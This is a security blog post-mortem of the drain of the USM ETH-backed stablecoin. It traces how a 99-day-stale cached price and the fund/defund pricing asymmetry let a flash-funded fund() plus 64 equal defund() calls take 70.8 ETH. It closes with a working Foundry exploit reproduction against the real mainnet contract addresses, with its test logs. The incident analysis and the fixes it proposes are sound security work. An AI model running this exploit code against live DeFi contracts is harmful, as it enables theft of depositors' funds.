---
title: "USM drained for 70.8 ETH by funding 62M FUM against a price that hadn't been refreshed in 99 days"
date: 2026-08-12T21:16:15+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
---

On ETH block 25716150, one transaction took 132.59 ETH out of the USM pool and left 61.76. The exploit was a single `fund()` call followed by 64 equal-sized `defund()` calls, all inside one flash loan. Net profit: 70.830977 ETH. The oracle was never touched.

Transaction: `0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e`

<!--more-->

## The protocol

USM (Minimalist USD v1) is an ETH-backed stablecoin with two tokens over one pool. USM holders hold a fixed-value claim (1 USM ≈ $1 of ETH), FUM holders hold the residual — the pool minus the USM liability, divided by FUM supply. Classic senior/junior split, `MAX_DEBT_RATIO` caps the senior side at 80% of pool value.

| contract                         | address                                      |
| -------------------------------- | -------------------------------------------- |
| USM (pool, holds all ETH)        | `0x2a7FFf44C19f39468064ab5e5c304De01D591675` |
| FUM (equity token, owned by USM) | `0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3` |
| MedianOracle (price source)      | `0x7F360C88CABdcC2F2874Ec4Eb05c3D47bD0726C5` |

MedianOracle takes the median of three sources: the Chainlink ETH/USD feed (`0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419`) and 10-minute TWAPs from two deep Uniswap V3 pools, USDC/WETH 0.05% (`0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640`) and WETH/USDT 0.05% (`0x11b815efB8f581194ae79006d24E0d814B7697F6`).

At the block before the attack (25716149), the system was small and quiet: `ethPool` = 132.588942983107019337 ETH, USM supply = 200,251.453135834662058063, FUM supply = 329,463.502710697641576863. Debt ratio 66.89%, not underwater. Five USM holders, 32 FUM holders, all EOAs — no pool, no lending protocol, no bridge ever held either token.

## Two prices, and only one of them is fresh

The contract keeps two price slots in `storedState`:

```
storedState.ethUsdPrice      // the mid price the system actually prices with
storedState.oracleEthUsdPrice // the last oracle reading it accepted, for comparison only
```

Every operation (`mint`/`burn`/`fund`/`defund`) starts by calling `checkForFreshOraclePrice`:

```solidity
oraclePrice = oracle.latestPrice() + HALF_TRILLION;
unchecked { oraclePrice = oraclePrice / TRILLION * TRILLION; }

if (oraclePrice == ls.oracleEthUsdPrice) {          // unchanged since last time
    price = ls.ethUsdPrice;                          // keep the stored mid
} else {
    price = oraclePrice;                             // adopt the fresh reading
    ...
}
```

So the stored mid only changes in two ways: a mint/burn/fund/defund pushes it with `wadMulDown`/`wadMulUp`, or the oracle returns a value that differs from the cached `oracleEthUsdPrice`, in which case the fresh oracle price replaces it outright. The mid has no time-based decay of its own. `bidAskAdjustment` does decay (half-life about a minute, zero after 600 seconds), but the mid doesn't.

At block 25716149 the cache said: `ethUsdPrice` = $2257.793612, `oracleEthUsdPrice` = $2304.031122. The timestamp on `bidAskAdjustment` was `1777691195` — 2026-05-02 03:06:35 UTC. That's 8,571,960 seconds, or 99.2 days, before the attack block. No one had called any of the four functions in 99 days. The last real activity was a 1.5-hour window in May 2026; before that the protocol had been near-silent since 2023 (the `PriceChanged` event count by year: 40, 148, 17, 2, 2, 10).

Here's the part that matters: in those 99 days the median oracle kept moving — Chainlink and the two TWAP pools price the real market, they don't wait for USM users. By block 25716149 the live median read $1921.81, about 16.6% below the cached `oracleEthUsdPrice`. The system just had no idea, because nobody had called it.

## The asymmetry that turns a refresh into money

`fund()` and `defund()` read the price through `adjustedEthUsdPrice`, and the two sides are not symmetric:

```solidity
if (side == IUSM.Side.Buy ? (adjustment > WAD) : (adjustment < WAD)) {
    price = price.wadMul(adjustment, ...);
}
```

`fund()` prices on the Buy side: when `bidAskAdjustment > 1` it multiplies the mid up. `defund()` prices on the Sell side: it only adjusts when `bidAskAdjustment < 1`, and otherwise uses the bare mid. The math inside `_fundFum` then pushes both the mid and the adjustment up (`wadMulUp` by a growth factor tied to how much the pool grew). So a large `fund()` raises the very mid that a later `defund()` reads without any adjustment. That's the mirror image of the better-known mint/burn relationship, and it means a single actor can push the price up with a `fund()` and collect the full, unadjusted push with `defund()`.

The stale price is what makes the push cheap. When the first `fund()` in 99 days runs, `checkForFreshOraclePrice` fires for the first time in 99 days: the mid jumps from the cached $2257.79 down to the live $1921.81. A 14.9% drop in the ETH/USD mid is a 14.9% drop in the USD value of each FUM claim denominator — the buffer (pool minus USM liability) shrinks, FUM gets priced cheaper for the buyer. The attacker then buys a huge amount of FUM at that suddenly-cheap price.

## The attack

1. Flash loan 11,579.978354608392803524 ETH from Morpho — about 87x the entire pool.
2. Unwrap to ETH, one call to `USM.fund(attacker, 0)` with all of it. This is the first interaction in 99 days: the mid is refreshed to $1921.81, the pool grows to ~11,712 ETH, and the attacker is minted 62,184,299.03 FUM.
3. Sixty-four equal `USM.defund(attacker, 971,629.67, 0)` calls — 62,184,299.03 divides exactly by 64. Each one redeems FUM for ETH at the pushed-up price, the pool shrinking a step at a time.
4. Loop until `FUM.balanceOf(attacker) == 0`. Wrap back to WETH, repay the flash loan.
5. Left with 70.830977 ETH. Pool went from 132.588942983107019337 wei to 61,757,965,615,409,310,965 wei.

No interaction with either Uniswap pool, no interaction with Chainlink. The median oracle was read passively, never manipulated. The price jump that made the math work was real market movement from 99 days of nobody asking.

## Reproduction

I reproduced the payout against the contract's own public pure pricing functions (`fund()`'s `fumFromFund`/`fumPrice` and `defund()`'s `ethFromDefund`), feeding the state at block 25716149 and the same parameters: 11,579.978354608392803524 ETH funded, then 64 equal defund chunks. Result: profit of 70.830977367697708372 ETH (the chain shows 70.830977), final pool `61757965615409310965` wei — byte-for-byte identical to the real ending balance.

## Why the redemption was split into 64

The 64-way split is not a stylistic choice; it's the difference between a profit and a loss of five thousand ETH. I ran both variants on the same fork, starting from the same 11,579.978354608392803524 ETH `fund()` and the same 62,184,299.03 FUM:

| redemption                        | ETH out                   | net on the position           |
| --------------------------------- | ------------------------- | ----------------------------- |
| 64 equal chunks (the real attack) | 11,650.809331976090511896 | **+70.830977367697708372**    |
| one full-size `defund()`          | 5,825.405636077073924807  | **−5,754.572718531318878717** |

A single redemption of everything returns roughly half of what was put in. It does not revert — my first assumption was that it would trip the `newDebtRatio <= MAX_DEBT_RATIO` check, but the shrink factor `ethFromDefund` returns is applied to `ethUsdPrice` *before* that check runs, and a one-shot burn drags the mid down far enough that the self-assessed ratio lands back under 80%. The transaction goes through and simply loses money.

The loss comes from the approximation inside `ethFromDefund`. It prices the whole burn at the arithmetic mean of the starting sell price and a deliberately pessimistic ending price: the pool is estimated through `lowerBoundEthQty1 = ethPool − fumIn·fumSellPrice0`, that bound is pushed through a fourth-power price path, and the ending FUM price is computed from the resulting (collapsed) mid. For a chunk that consumes the entire FUM supply, that path collapses all the way: the pessimistic mid makes `buffer = ethPool − usmValueInEth` go negative, `fumPrice` clamps to 0, and the mean price becomes `(p0 + 0)/2 = p0/2` — you get back about half your position, which is exactly what the fork shows (5,825.4 / 11,579.98 ≈ 50.3%).

The curve is non-monotonic in the amount burned. Small chunks stay on the profitable side because the pessimistic bound stays close to the real path; a full-size burn lands deep in the bad region. The exploit needed both halves: the stale-price refresh to make FUM cheap to buy, and the chunking to make the exit profitable.

## Why this is worth a note beyond the $160k

The oracle was accurate. Median-of-three with a Chainlink feed and two top-TVL TWAP pools is about as good as it gets, and none of it was attacked. What failed is that the system kept pricing with a 99-day-old cached value and had no notion that staleness itself is a hazard — the first caller after a long silence gets to redeem 99 days of accumulated market movement at once, amplified by the fund/defund buy-sell asymmetry. For a live protocol the same shape is available on a smaller scale: any gap between the cached `oracleEthUsdPrice` and the live median, no matter how long it's been accumulating, gets collected by whoever calls `fund()` first and walks it back out through `defund()`.

The cheap fix is a freshness check — compare the oracle reading's timestamp against `block.timestamp` before adopting it, or simply refresh the stored price on a schedule. The structural fix is to price `defund()` (and the debt-ratio check it feeds) off the fresh oracle reading instead of the driftable internal mid, same as the haircut in `ethFromBurn`. As it stands, `burn` carries no debt-ratio check at all while `defund` does — an asymmetry that did not trigger here but is part of the same family. The pool still holds 61.76 ETH of someone's money, and USM's five holders now sit on claims against a pool that no longer covers 100% of them.



## POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";

/// @notice Minimal interface onto the REAL deployed USM/FUM contracts.
interface IUSM {
    struct LoadedState {
        uint256 timeSystemWentUnderwater;
        uint256 ethUsdPrice;
        uint256 oracleEthUsdPrice;
        uint256 bidAskAdjustmentTimestamp;
        uint256 bidAskAdjustment;
        uint256 ethPool;
        uint256 usmTotalSupply;
    }

    function fund(address to, uint256 minFumOut) external payable returns (uint256 fumOut);
    function defund(address payable to, uint256 fumToBurn, uint256 minEthOut) external returns (uint256 ethOut);
    function ethPool() external view returns (uint256);
    function loadState() external view returns (LoadedState memory);
    function oracle() external view returns (address);
}

interface IMedianOracle {
    function latestPrice() external view returns (uint256);
}

interface IFUM {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

/// @title USMAttackPOC
/// @notice Independent exploit reproduction: starting ONLY from the state at block ANALYSIS_HEIGHT
/// (the block before the real attack — the same world the attacker saw), drive the REAL deployed
/// contracts through a flash-funded `fund()` then 64 equal `defund()` chunks, and assert the attack
/// is *profitable* — not that it matches any post-hoc trace value. The contract executes its real
/// storage writes, oracle refresh, debt-ratio check, and FUM mint/burn.
///
/// @dev The flash loan is simulated with vm.deal(): Morpho only provides the capital, it does not
/// affect the USM attack path itself. Fork RPC comes from foundry.toml [rpc_endpoints] eth.
/// The post-mortem match against tx 0xfae5e751...050e is documented in log.md §6, not asserted here.
contract USMAttackPOC is Test {
    IUSM constant USM = IUSM(0x2a7FFf44C19f39468064ab5e5c304De01D591675);
    IFUM constant FUM = IFUM(0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3);

    /// @dev forge-std's Test has no receive(); defund() pays ETH via `to.sendValue()` so the
    /// test contract must accept plain ETH transfers.
    receive() external payable {}

    uint256 constant ANALYSIS_HEIGHT = 25716149; // attack block - 1, never touch 25716150

    // Attacker-chosen parameters (strategy, not answers): a huge flash-funded position, redeemed
    // in 64 equal chunks. test_03 shows why equal chunks matter (one-shot full redemption loses).
    uint256 constant FLASH_LOAN = 11579978354608392803524; // 11,579.978354608392803524 ETH
    uint256 constant CHUNK = 971629672368796643705079; // 971,629.672368796643705079 FUM per defund
    uint256 constant NUM_CHUNKS = 64;

    function setUp() public {
        vm.createSelectFork("eth", ANALYSIS_HEIGHT);
    }

    /// @notice Premise: at ANALYSIS_HEIGHT the system's stored oracle price is 99.2 days stale,
    /// while the live median oracle has moved (this is the price jump the attacker's fund() adopts).
    function test_01_premise_staleStoredPriceVsLiveOracle() public view {
        IUSM.LoadedState memory ls = USM.loadState();
        uint256 live = IMedianOracle(USM.oracle()).latestPrice();

        console2.log("stored oracleEthUsdPrice (99.2d stale):", ls.oracleEthUsdPrice);
        console2.log("stored ethUsdPrice (mid):", ls.ethUsdPrice);
        console2.log("LIVE oracle.latestPrice() at ANALYSIS_HEIGHT:", live);
        assertGt(live, 0, "oracle should be live");
        assertTrue(live != ls.oracleEthUsdPrice, "stale vs live oracle price must differ");
    }

    /// @notice The exploit: one huge fund() then 64 equal defund() chunks. Assertions are
    /// self-contained (profitability, FUM drained, pool drawdown == profit) — no trace values.
    function test_02_fullAttack_fundThen64xDefund() public {
        // simulate the flash loan proceeds arriving at the attacker (Morpho does not touch USM)
        vm.deal(address(this), FLASH_LOAN);

        uint256 poolBefore = USM.ethPool();
        console2.log("ethPool before attack:", poolBefore);

        // Step 1: one huge fund(). 99 days after the last interaction, this is the call that
        // triggers checkForFreshOraclePrice and adopts the live (~$1921) price over the stale cache.
        uint256 fumOut = USM.fund{value: FLASH_LOAN}(address(this), 0);
        console2.log("fumOut from fund():", fumOut);

        // Step 2: 64 equal defund chunks; the last chunk eats the rounding remainder.
        uint256 remaining = fumOut;
        uint256 totalEthOut;
        for (uint256 i = 0; i < NUM_CHUNKS; i++) {
            uint256 chunk = (i == NUM_CHUNKS - 1) ? remaining : CHUNK;
            uint256 ethOut = USM.defund(payable(address(this)), chunk, 0);
            totalEthOut += ethOut;
            remaining -= chunk;
            assertLt(remaining, fumOut, "remaining FUM should only shrink");
        }

        assertEq(FUM.balanceOf(address(this)), 0, "attacker must hold zero FUM at the end");
        console2.log("total ETH out across", NUM_CHUNKS, "defunds:", totalEthOut);
        console2.log("flash loan principal:", FLASH_LOAN);

        int256 netProfit = int256(totalEthOut) - int256(FLASH_LOAN);
        console2.logInt(netProfit);
        assertGt(netProfit, 0, "the attack must be profitable");

        console2.log("final ethPool:", USM.ethPool());
        // The profit comes out of the pool: pool drawdown == attacker profit (value conservation).
        assertEq(poolBefore - USM.ethPool(), uint256(netProfit), "pool drawdown == attacker profit");
    }

    /// @notice Why 64 chunks: a single full-size defund() of everything at once lands on the
    /// loss-making side of ethFromDefund's non-monotonic curve (it does NOT revert — the shrink
    /// factor drags the self-assessed debt ratio back under 80%). Chunking is what keeps each
    /// redemption on the profitable part of the curve. Contrast with test_02's positive profit.
    function test_03_singleFullDefund_isLossMaking() public {
        vm.deal(address(this), FLASH_LOAN);
        uint256 fumOut = USM.fund{value: FLASH_LOAN}(address(this), 0);

        // one-shot full redemption instead of 64 chunks
        uint256 ethOut = USM.defund(payable(address(this)), fumOut, 0);
        console2.log("single full defund ethOut:", ethOut);
        console2.log("fund principal:", FLASH_LOAN);
        assertLt(ethOut, FLASH_LOAN, "one-shot defund must be loss-making vs the 64-chunk split");
    }
}

```

```
Ran 3 tests for test/USMAttackPOC.t.sol:USMAttackPOC
[PASS] test_01_premise_staleStoredPriceVsLiveOracle() (gas: 162090)
Logs:
  stored oracleEthUsdPrice (99.2d stale): 2304031122000000000000
  stored ethUsdPrice (mid): 2257793612000000000000
  LIVE oracle.latestPrice() at ANALYSIS_HEIGHT: 1921813593298974977671

[PASS] test_02_fullAttack_fundThen64xDefund() (gas: 5680271)
Logs:
  ethPool before attack: 132588942983107019337
  fumOut from fund(): 62184299031602985197125048
  total ETH out across 64 defunds: 11650809331976090511896
  flash loan principal: 11579978354608392803524
  70830977367697708372
  final ethPool: 61757965615409310965

[PASS] test_03_singleFullDefund_isLossMaking() (gas: 288756)
Logs:
  single full defund ethOut: 5825405636077073924807
  fund principal: 11579978354608392803524
```

